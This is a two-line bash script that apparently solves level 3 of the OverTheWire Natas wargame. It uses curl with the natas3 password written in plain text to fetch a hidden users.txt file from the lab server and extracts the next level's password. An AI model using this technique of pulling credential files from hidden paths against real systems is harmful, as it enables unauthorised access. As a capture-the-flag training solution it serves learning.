#!/usr/bin/bash

curl -s -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | grep -oP '(?<=(natas4:)).*'
